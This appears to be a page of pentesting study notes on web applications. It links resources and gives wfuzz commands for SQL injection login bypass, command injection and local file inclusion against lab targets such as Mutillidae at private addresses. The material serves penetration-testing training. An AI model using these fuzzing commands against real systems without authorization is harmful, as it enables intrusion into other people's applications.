################
Web Applications
################

* http://www.vulnerablewebapps.org/
* https://docs.google.com/document/d/101EsKlu41ICdeE7mEv189SS8wMtcdXfRtua0ClYjP1M/edit
* https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md
* https://jumpespjump.blogspot.com/2014/03/attacking-adobe-coldfusion.html
* https://medium.com/bugbountywriteup/sql-injection-with-load-file-and-into-outfile-c62f7d92c4e2
* https://github.com/dzonerzy/goWAPT
* https://www.rapid7.com/research/report/exploiting-jsos/
* https://github.com/qazbnm456/awesome-web-security

Enumeration
===========

* Run nikto, dirsearch, etc.
* Proxy application in Burp. Add application to scope and run Burp Spider (often discovers "hidden" URLs from source code, etc.)
* Do directory traversal (e.g. if /path/to/file.js exists, visit /path/to and /path as well)

Fuzzing
=======

wfuzz
-----

**Generic**

Use wfuzz with some generic payloads to determine "standard" response attributes (e.g. code, length, number of words, number of lines, etc.)

.. code-block:: none

    wfuzz -c -u 'http://10.0.0.1/path/to/login.php' -d 'username=FUZZ{username}&password=password&login-php-submit-button=Login' -z range,1-10

**SQL Injection**

For login bypass, we want to flag non-200 response codes, and responses which don't contain the login errors. Note that due to some bash weirdness, you need to get creative with the filter value:

.. code-block:: none

    wfuzz -c -u 'http://10.0.0.1/path/to/login.php' -d 'username=FUZZ{username}&password=password&login-php-submit-button=Login' -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt,urlencode --filter="code != 200 or content "\!"~ 'Account does not exist' or content "\!"~ 'Password incorrect'"

For regular SQL injection, we likely want to flag responses which don't include specific error messages

.. code-block:: none

    wfuzz -c -u 'http://192.168.1.76/mutillidae/index.php?page=user-info.php&username=FUZZ{test}&password=&user-info-php-submit-button=View+Account+Details' -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt,urlencode --filter="content "\!"~ 'SQL Syntax' and content "\!"~ '0 records found'"

**Command Injection**

.. code-block:: none

    wfuzz -c -u 'http://192.168.1.76/mutillidae/index.php?page=dns-lookup.php&target_host=FUZZ{test}' -z file,fuzzdb/attack/os-cmd-execution/command-execution-unix.txt,urlencode --filter="content ~ 'uid='"

**LFI**

.. code-block:: none

    wfuzz -c -u 'http://192.168.1.76/mutillidae/index.php?page=FUZZ{arbitrary-file-inclusion.php}' -z file,/usr/share/wordlists/wfuzz/Injections/Traversal.txt,urlencode --filter "lines != 1008"
